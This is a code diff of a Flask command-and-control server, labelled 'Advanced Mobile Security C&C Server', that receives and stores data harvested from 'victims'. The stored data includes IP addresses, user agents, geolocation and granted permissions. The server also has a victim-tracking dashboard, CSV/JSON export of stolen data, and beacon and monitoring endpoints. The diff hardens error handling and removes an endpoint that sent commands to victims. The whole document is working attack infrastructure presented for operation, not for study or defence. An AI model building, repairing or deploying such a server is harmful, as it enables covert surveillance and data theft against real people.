-            currentData.victims.forEach(victim => {
-                const ua = victim.user_agent || '';
-                let os = 'Unknown';
-                if (ua.includes('Windows')) os = 'Windows';
-                else if (ua.includes('Android')) os = 'Android';
-                else if (ua.includes('iPhone')) os = 'iOS';
-                else if (ua.includes('Mac')) os = 'macOS';
+        async function testDatabase() {
+            try {
+                const response = await fetch('/debug/db');
+                const data = await response.json();
                 
-                osCounts[os] = (osCounts[os] || 0) + 1;
-            });
-            
-            return Object.keys(osCounts).reduce((a, b) => osCounts[a] > osCounts[b] ? a : b);
-        }
-        
-        // Auto-refresh functionality
-        function startAutoRefresh() {
-            if (refreshTimer) clearInterval(refreshTimer);
-            
-            refreshTimer = setInterval(() => {
-                if (autoRefreshEnabled) {
-                    refreshAllData();
+                if (response.ok) {
+                    showMessage(`Database OK: ${data.tables.length} tables, Status: ${data.status}`, 'info');
+                } else {
+                    throw new Error(data.error || 'Database test failed');
                 }
-            }, refreshInterval);
+            } catch (error) {
+                showMessage(`Database test failed: ${error.message}`, 'error');
+            }
         }
         
         function toggleAutoRefresh() {
@@ -1199,6 +780,23 @@ def dashboard():
             } else {
                 if (refreshTimer) clearInterval(refreshTimer);
             }
+        }
+        
+        function updateRefreshInterval() {
+            refreshInterval = parseInt(document.getElementById('refresh-interval').value) * 1000;
+            if (autoRefreshEnabled) {
+                startAutoRefresh();
+            }
+        }
+        
+        function startAutoRefresh() {
+            if (refreshTimer) clearInterval(refreshTimer);
+            
+            refreshTimer = setInterval(() => {
+                if (autoRefreshEnabled) {
+                    refreshAllData();
+                }
+            }, refreshInterval);
         }
         
         // Initialize dashboard
@@ -1218,89 +816,111 @@ def dashboard():
             
             console.log('🎯 Advanced C&C Dashboard loaded successfully');
         });
-        
-        // Filter functions (implement as needed)
-        function filterVictims() { /* TODO */ }
-        function filterData() { /* TODO */ }
-        function filterTimeline() { /* TODO */ }
     </script>
 </body>
 </html>
     '''
     return dashboard_html
 
-# Enhanced API endpoints
+# Enhanced API endpoints with better error handling
 @app.route('/api/dashboard-data')
 def api_dashboard_data():
-    """Comprehensive dashboard data endpoint"""
+    """Comprehensive dashboard data endpoint with improved error handling"""
     try:
         conn = sqlite3.connect(DATABASE)
         cursor = conn.cursor()
         
-        # Get victim statistics
-        cursor.execute('SELECT COUNT(*) FROM victims')
-        total_victims = cursor.fetchone()[0] or 0
+        # Test database connection first
+        cursor.execute("SELECT 1")
         
-        five_minutes_ago = datetime.now() - timedelta(minutes=5)
-        cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
-        online_victims = cursor.fetchone()[0] or 0
+        # Get victim statistics with safe fallbacks
+        try:
+            cursor.execute('SELECT COUNT(*) FROM victims')
+            total_victims = cursor.fetchone()[0] or 0
+        except Exception as e:
+            log_activity(f"Error counting victims: {e}")
+            total_victims = 0
         
-        cursor.execute('SELECT COUNT(*) FROM collected_data')
-        total_data = cursor.fetchone()[0] or 0
+        try:
+            five_minutes_ago = (datetime.now() - timedelta(minutes=5)).isoformat()
+            cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
+            online_victims = cursor.fetchone()[0] or 0
+        except Exception as e:
+            log_activity(f"Error counting online victims: {e}")
+            online_victims = 0
         
-        cursor.execute('SELECT COUNT(*) FROM collected_data WHERE severity = "high"')
-        high_severity = cursor.fetchone()[0] or 0
+        try:
+            cursor.execute('SELECT COUNT(*) FROM collected_data')
+            total_data = cursor.fetchone()[0] or 0
+        except Exception as e:
+            log_activity(f"Error counting data: {e}")
+            total_data = 0
         
-        cursor.execute('SELECT COUNT(DISTINCT attack_type) FROM victims')
-        attack_types = cursor.fetchone()[0] or 0
+        try:
+            cursor.execute('SELECT COUNT(*) FROM collected_data WHERE severity = "high"')
+            high_severity = cursor.fetchone()[0] or 0
+        except Exception as e:
+            log_activity(f"Error counting high severity: {e}")
+            high_severity = 0
         
-        # Get victims with enhanced data
-        cursor.execute('''
-            SELECT victim_id, attack_type, ip_address, last_seen, user_agent, 
-                   status, location_lat, location_lng, device_info, permissions_granted,
-                   first_seen
-            FROM victims 
-            ORDER BY last_seen DESC 
-            LIMIT 100
-        ''')
+        try:
+            cursor.execute('SELECT COUNT(DISTINCT attack_type) FROM victims')
+            attack_types = cursor.fetchone()[0] or 0
+        except Exception as e:
+            log_activity(f"Error counting attack types: {e}")
+            attack_types = 0
         
+        # Get victims with safe error handling
         victims = []
-        for row in cursor.fetchall():
-            victims.append({
-                'victim_id': row[0],
-                'attack_type': row[1],
-                'ip_address': row[2],
-                'last_seen': row[3],
-                'user_agent': row[4],
-                'status': row[5],
-                'location_lat': row[6],
-                'location_lng': row[7],
-                'device_info': row[8],
-                'permissions_granted': row[9],
-                'first_seen': row[10]
-            })
+        try:
+            cursor.execute('''
+                SELECT victim_id, attack_type, ip_address, last_seen, user_agent, 
+                       status, location_lat, location_lng, first_seen
+                FROM victims 
+                ORDER BY last_seen DESC 
+                LIMIT 100
+            ''')
+            
+            for row in cursor.fetchall():
+                victims.append({
+                    'victim_id': row[0] or '',
+                    'attack_type': row[1] or 'unknown',
+                    'ip_address': row[2] or 'unknown',
+                    'last_seen': row[3] or '',
+                    'user_agent': row[4] or '',
+                    'status': row[5] or 'unknown',
+                    'location_lat': row[6],
+                    'location_lng': row[7],
+                    'first_seen': row[8] or ''
+                })
+        except Exception as e:
+            log_activity(f"Error fetching victims: {e}")
+            victims = []
         
-        # Get recent data points
-        cursor.execute('''
-            SELECT id, victim_id, data_type, data_content, timestamp, 
-                   source_url, severity, tags
-            FROM collected_data 
-            ORDER BY timestamp DESC 
-            LIMIT 200
-        ''')
-        
+        # Get recent data points with safe error handling
         data_points = []
-        for row in cursor.fetchall():
-            data_points.append({
-                'id': row[0],
-                'victim_id': row[1],
-                'data_type': row[2],
-                'data_content': row[3],
-                'timestamp': row[4],
-                'source_url': row[5],
-                'severity': row[6],
-                'tags': row[7]
-            })
+        try:
+            cursor.execute('''
+                SELECT id, victim_id, data_type, data_content, timestamp, 
+                       source_url, severity
+                FROM collected_data 
+                ORDER BY timestamp DESC 
+                LIMIT 200
+            ''')
+            
+            for row in cursor.fetchall():
+                data_points.append({
+                    'id': row[0],
+                    'victim_id': row[1] or '',
+                    'data_type': row[2] or 'unknown',
+                    'data_content': row[3] or '{}',
+                    'timestamp': row[4] or '',
+                    'source_url': row[5] or 'unknown',
+                    'severity': row[6] or 'medium'
+                })
+        except Exception as e:
+            log_activity(f"Error fetching data points: {e}")
+            data_points = []
         
         conn.close()
         
@@ -1318,120 +938,84 @@ def api_dashboard_data():
         
     except Exception as e:
         log_activity(f"❌ Error in api_dashboard_data: {e}")
-        return jsonify({'error': str(e)}), 500
+        traceback.print_exc()
+        return jsonify({
+            'error': str(e),
+            'stats': {
+                'total_victims': 0,
+                'online_victims': 0,
+                'total_data': 0,
+                'high_severity': 0,
+                'attack_types': 0
+            },
+            'victims': [],
+            'dataPoints': []
+        }), 500
 
-@app.route('/api/victim/<victim_id>/details')
-def api_victim_details(victim_id):
-    """Get detailed victim information"""
+@app.route('/collect', methods=['POST', 'OPTIONS'])
+def collect_data():
+    """Main data collection endpoint with improved error handling"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     try:
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
+        # Get data with safe fallbacks
+        data = request.get_json() or {}
+        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+        user_agent = request.headers.get('User-Agent', 'Unknown')
         
-        # Get victim info
-        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
-        victim_row = cursor.fetchone()
+        # Extract required fields with safe defaults
+        victim_id = data.get('victim_id') or f'victim_{int(time.time())}'
+        data_type = data.get('type') or 'unknown'
+        source_url = data.get('source_url') or 'unknown'
+        attack_type = data.get('attack_type') or 'unknown'
         
-        if not victim_row:
-            return jsonify({'error': 'Victim not found'}), 404
+        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
         
-        # Get all data points for this victim
-        cursor.execute('''
-            SELECT * FROM collected_data 
-            WHERE victim_id = ? 
-            ORDER BY timestamp DESC
-        ''', (victim_id,))
-        data_rows = cursor.fetchall()
+        # Store data with better error handling
+        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
         
-        conn.close()
-        
-        # Format victim data
-        victim = {
-            'victim_id': victim_row[1],
-            'session_id': victim_row[2],
-            'first_seen': victim_row[3],
-            'last_seen': victim_row[4],
-            'user_agent': victim_row[5],
-            'ip_address': victim_row[6],
-            'attack_type': victim_row[7],
-            'status': victim_row[8],
-            'location_lat': victim_row[9],
-            'location_lng': victim_row[10],
-            'device_info': victim_row[11],
-            'permissions_granted': victim_row[12]
-        }
-        
-        # Format data points
-        data_points = []
-        for row in data_rows:
-            data_points.append({
-                'id': row[0],
-                'data_type': row[2],
-                'data_content': json.loads(row[3]) if row[3] else {},
-                'timestamp': row[4],
-                'source_url': row[5],
-                'severity': row[6]
+        if success:
+            return jsonify({
+                'status': 'received',
+                'timestamp': datetime.now().isoformat(),
+                'victim_id': victim_id
             })
-        
-        return jsonify({
-            'victim': victim,
-            'dataPoints': data_points
-        })
-        
-    except Exception as e:
-        log_activity(f"❌ Error in api_victim_details: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/send-command', methods=['POST'])
-def api_send_command():
-    """Send command to victim"""
-    try:
-        data = request.get_json()
-        victim_id = data.get('victim_id')
-        command_type = data.get('command_type')
-        
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            INSERT INTO commands (victim_id, command_type, command_data)
-            VALUES (?, ?, ?)
-        ''', (victim_id, command_type, json.dumps(data)))
-        
-        command_id = cursor.lastrowid
-        conn.commit()
-        conn.close()
-        
-        log_activity(f"📤 Command '{command_type}' sent to {victim_id[:12]}...")
-        
-        return jsonify({
-            'status': 'success',
-            'command_id': command_id,
-            'message': f'Command {command_type} sent to victim'
-        })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': 'Database storage failed',
+                'timestamp': datetime.now().isoformat()
+            }), 500
         
     except Exception as e:
-        log_activity(f"❌ Error in api_send_command: {e}")
-        return jsonify({'error': str(e)}), 500
+        log_activity(f"❌ Error in collect_data: {e}")
+        traceback.print_exc()
+        return jsonify({
+            'error': 'Internal server error',
+            'message': str(e),
+            'timestamp': datetime.now().isoformat()
+        }), 500
 
 @app.route('/api/export/<export_type>')
 def api_export(export_type):
-    """Export data in various formats"""
+    """Export data in various formats with improved error handling"""
     try:
         conn = sqlite3.connect(DATABASE)
         
         if export_type == 'victims':
             cursor = conn.cursor()
-            cursor.execute('SELECT * FROM victims')
+            cursor.execute('SELECT * FROM victims ORDER BY last_seen DESC')
             data = cursor.fetchall()
             
             # Create CSV
             output = io.StringIO()
             writer = csv.writer(output)
             writer.writerow(['ID', 'Victim ID', 'Session ID', 'First Seen', 'Last Seen', 
-                           'User Agent', 'IP Address', 'Attack Type', 'Status'])
+                           'User Agent', 'IP Address', 'Attack Type', 'Status', 
+                           'Location Lat', 'Location Lng'])
             writer.writerows(data)
             
-            # Return as file download
             response = app.response_class(
                 output.getvalue(),
                 mimetype='text/csv',
@@ -1442,7 +1026,7 @@ def api_export(export_type):
             
         elif export_type == 'data':
             cursor = conn.cursor()
-            cursor.execute('SELECT * FROM collected_data')
+            cursor.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
             data = cursor.fetchall()
             
             # Convert to JSON format
@@ -1475,7 +1059,7 @@ def api_export(export_type):
 
 @app.route('/api/clear-data', methods=['POST'])
 def api_clear_data():
-    """Clear all data from database"""
+    """Clear all data from database with improved error handling"""
     try:
         conn = sqlite3.connect(DATABASE)
         cursor = conn.cursor()
@@ -1496,37 +1080,7 @@ def api_clear_data():
         log_activity(f"❌ Error in api_clear_data: {e}")
         return jsonify({'error': str(e)}), 500
 
-# Keep all the existing endpoints from the previous version
-@app.route('/collect', methods=['POST', 'OPTIONS'])
-def collect_data():
-    """Main data collection endpoint with better error handling"""
-    if request.method == 'OPTIONS':
-        return '', 200
-    
-    try:
-        data = request.get_json() or {}
-        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-        user_agent = request.headers.get('User-Agent', 'Unknown')
-        
-        victim_id = data.get('victim_id', f'unknown_{int(time.time())}')
-        data_type = data.get('type', 'unknown')
-        source_url = data.get('source_url', 'unknown')
-        attack_type = data.get('attack_type', 'unknown')
-        
-        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
-        
-        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
-        
-        if success:
-            return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
-        else:
-            return jsonify({'status': 'error', 'message': 'Database storage failed'}), 500
-        
-    except Exception as e:
-        log_activity(f"❌ Error in collect_data: {e}")
-        traceback.print_exc()
-        return jsonify({'error': 'Internal server error', 'message': str(e)}), 500
-
+# Keep existing endpoints for backward compatibility
 @app.route('/monitor', methods=['POST', 'OPTIONS'])
 def monitor_endpoint():
     """Background monitoring endpoint"""
@@ -1599,8 +1153,8 @@ def beacon_endpoint():
 def api_victims():
     """Legacy API endpoint for backward compatibility"""
     try:
-        response_data = api_dashboard_data()
-        dashboard_data = response_data.get_json()
+        dashboard_response = api_dashboard_data()
+        dashboard_data = dashboard_response.get_json()
         
         return jsonify({
             'total': dashboard_data['stats']['total_victims'],
@@ -1669,11 +1223,10 @@ def victim_details(victim_id):
             <div class="back-btn">
                 <button onclick="window.close()">❌ Close</button>
                 <button onclick="location.reload()">🔄 Refresh</button>
-                <button onclick="exportVictimData()">💾 Export</button>
             </div>
             
             <div class="header">
-                <h1>🎯 Advanced Victim Analysis Report</h1>
+                <h1>🎯 Fixed Victim Analysis Report</h1>
                 <p><strong>Victim ID:</strong> {victim_id}</p>
                 <div class="info-grid">
                     <div class="info-box">
@@ -1699,12 +1252,6 @@ def victim_details(victim_id):
             </div>
             
             <h2>📊 Collected Data Points ({len(data_points)} total)</h2>
-            <div style="margin: 15px 0;">
-                <button onclick="filterBySeverity('high')" style="background: #ff6b6b;">High Severity</button>
-                <button onclick="filterBySeverity('medium')" style="background: #ffaa00;">Medium Severity</button>
-                <button onclick="filterBySeverity('low')" style="background: #888;">Low Severity</button>
-                <button onclick="filterBySeverity('')" style="background: #00ff41;">Show All</button>
-            </div>
         '''
         
         for i, data_point in enumerate(data_points):
@@ -1730,23 +1277,6 @@ def victim_details(victim_id):
             '''
         
         html += '''
-            <script>
-                function filterBySeverity(severity) {
-                    const entries = document.querySelectorAll('.data-entry');
-                    entries.forEach(entry => {
-                        if (severity === '' || entry.dataset.severity === severity) {
-                            entry.style.display = 'block';
-                        } else {
-                            entry.style.display = 'none';
-                        }
-                    });
-                }
-                
-                function exportVictimData() {
-                    const victimId = window.location.pathname.split('/').pop();
-                    window.open('/api/export/victim/' + victimId, '_blank');
-                }
-            </script>
         </body>
         </html>
         '''
@@ -1764,14 +1294,14 @@ def health_check():
         'status': 'healthy',
         'service': 'mobile-security-c2',
         'timestamp': datetime.now().isoformat(),
-        'version': '2.0.0-advanced',
+        'version': '2.1.0-database-fixed',
         'features': [
+            'Fixed Database Storage',
+            'Improved Error Handling',
             'Advanced Dashboard',
             'Real-time Monitoring', 
             'Data Export',
-            'Command & Control',
-            'Geolocation Tracking',
-            'Timeline Analysis'
+            'Victim Management'
         ]
     })
 
@@ -1792,15 +1322,21 @@ def debug_database():
             try:
                 cursor.execute(f'SELECT COUNT(*) FROM {table[0]}')
                 counts[table[0]] = cursor.fetchone()[0]
-            except:
-                counts[table[0]] = 'Error'
+            except Exception as e:
+                counts[table[0]] = f'Error: {e}'
         
         # Get recent activity
-        cursor.execute('SELECT data_type, COUNT(*) FROM collected_data GROUP BY data_type')
-        data_types = dict(cursor.fetchall())
+        try:
+            cursor.execute('SELECT data_type, COUNT(*) FROM collected_data GROUP BY data_type')
+            data_types = dict(cursor.fetchall())
+        except:
+            data_types = {}
         
-        cursor.execute('SELECT attack_type, COUNT(*) FROM victims GROUP BY attack_type')
-        attack_types = dict(cursor.fetchall())
+        try:
+            cursor.execute('SELECT attack_type, COUNT(*) FROM victims GROUP BY attack_type')
+            attack_types = dict(cursor.fetchall())
+        except:
+            attack_types = {}
         
         conn.close()
         
@@ -1811,7 +1347,7 @@ def debug_database():
             'data_types': data_types,
             'attack_types': attack_types,
             'status': 'ok',
-            'version': '2.0.0-advanced'
+            'version': '2.1.0-database-fixed'
         })
         
     except Exception as e:
@@ -1823,31 +1359,32 @@ def debug_database():
 def print_startup_banner():
     """Enhanced startup banner"""
     print("=" * 70)
-    print("🎯 ADVANCED MOBILE SECURITY C&C SERVER")
+    print("🎯 FIXED ADVANCED MOBILE SECURITY C&C SERVER")
     print("=" * 70)
     print("🚅 Platform: Railway")
     print("📡 Status: ONLINE")
     print(f"🌐 Port: {PORT}")
-    print("💾 Database: SQLite (Enhanced Schema)")
-    print("🔧 Version: 2.0.0-advanced")
+    print("💾 Database: SQLite (Fixed Schema)")
+    print("🔧 Version: 2.1.0-database-fixed")
     print("=" * 70)
-    print("🚀 NEW FEATURES:")
-    print("  ✅ Advanced Dashboard with Multiple Views")
+    print("🛠️  DATABASE FIXES:")
+    print("  ✅ Fixed Database Schema Issues")
+    print("  ✅ Improved Error Handling")
+    print("  ✅ Safe Data Insertion")
+    print("  ✅ Better Connection Management")
+    print("  ✅ Robust Fallback Values")
+    print("=" * 70)
+    print("🚀 FEATURES:")
+    print("  ✅ Advanced Dashboard")
     print("  ✅ Real-time Victim Monitoring")
-    print("  ✅ Geolocation Tracking & Mapping")
-    print("  ✅ Timeline Analysis")
-    print("  ✅ Command & Control System")
     print("  ✅ Data Export (CSV/JSON)")
-    print("  ✅ Severity-based Data Classification")
     print("  ✅ Enhanced Victim Profiles")
+    print("  ✅ Auto-refresh Dashboard")
     print("=" * 70)
     print("📱 Available Endpoints:")
-    print("  GET  /              - Advanced Dashboard")
-    print("  POST /collect       - Data Collection")
-    print("  POST /monitor       - Background Monitoring")
+    print("  GET  /              - Fixed Dashboard")
+    print("  POST /collect       - Fixed Data Collection")
     print("  GET  /api/dashboard-data - Dashboard Data")
-    print("  GET  /api/victim/<id>/details - Victim Details")
-    print("  POST /api/send-command - Send Commands")
     print("  GET  /api/export/<type> - Data Export")
     print("  GET  /health        - Health Check")
     print("  GET  /debug/db      - Database Debug")
@@ -1856,7 +1393,7 @@ def print_startup_banner():
     print("=" * 70)
 
 if __name__ == '__main__':
-    # Initialize enhanced database
+    # Initialize fixed database
     init_success = init_db()
     
     if not init_success:
